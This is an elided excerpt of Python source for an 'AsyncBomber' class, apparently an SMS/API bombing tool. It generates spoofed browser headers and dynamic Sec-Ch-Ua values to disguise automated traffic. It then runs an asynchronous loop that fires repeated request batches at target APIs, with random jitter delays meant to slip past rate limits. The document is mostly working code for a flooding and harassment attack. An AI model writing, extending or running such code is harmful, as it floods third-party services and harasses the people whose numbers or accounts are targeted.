...
class AsyncBomber:
    ...
    def get_headers(self, url=None, extra=None):
        """Generates advanced professional headers to mimic real browser behavior, including dynamic Sec-Ch-Ua values."""
        user_agent = random.choice(USER_AGENTS)
        
        # Extract browser and version from User-Agent for Sec-Ch-Ua
        browser_info = []
        platform = "Unknown"
        if "Chrome" in user_agent and "Safari" in user_agent:
            chrome_version = user_agent.split("Chrome/")[1].split(" ")[0]
            browser_info.append(f'"Google Chrome";v="{chrome_version.split(".")[0]}"')
            browser_info.append(f'"Chromium";v="{chrome_version.split(".")[0]}"')
            browser_info.append('"Not(A:Brand";v="99"') # Common for Chrome-based browsers
            if "Windows NT" in user_agent: platform = "Windows"
            ...
            browser_info.append(f'"Firefox";v="{firefox_version.split(".")[0]}"')
            ...
            browser_info.append(f'"Safari";v="{safari_version.split(".")[0]}"')
            browser_info.append('"Not(A:Brand";v="99"')
            if "iPhone" in user_agent or "iPad" in user_agent: platform = "iOS"
            elif "Macintosh" in user_agent: platform = "macOS"

        sec_ch_ua = ", ".join(browser_info) if browser_info else '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"'
        ...
        headers = {
            ...
            "Sec-Fetch-User": "?1",
            "DNT": "1", # Do Not Track
            "X-Requested-With": "XMLHttpRequest" if url and "api" in url else None # Only send for API calls
        }
        ...
        if url:
            ...
            headers["Sec-Fetch-Site"] = "cross-site" if base_url != urlparse(url).scheme + "://" + urlparse(url).netloc else "same-origin"
    ...
    async def bomb_task(self):
        ...
        while self.running and not self.stop_event.is_set():
            ...
            while (asyncio.get_event_loop().time() - batch_start_time) < self.request_batch_duration and self.running and not self.stop_event.is_set():
                ...
                try:
                    # Pre-request jitter: A small random delay before sending the request
                    await asyncio.sleep(random.uniform(0.1, 0.8))
                    await api()
                except Exception as e:
                    logging.error(f"{R}[!] Task Exception: {e}{e}{W}")

                # Post-request random delay: A shorter, more precise delay after each request
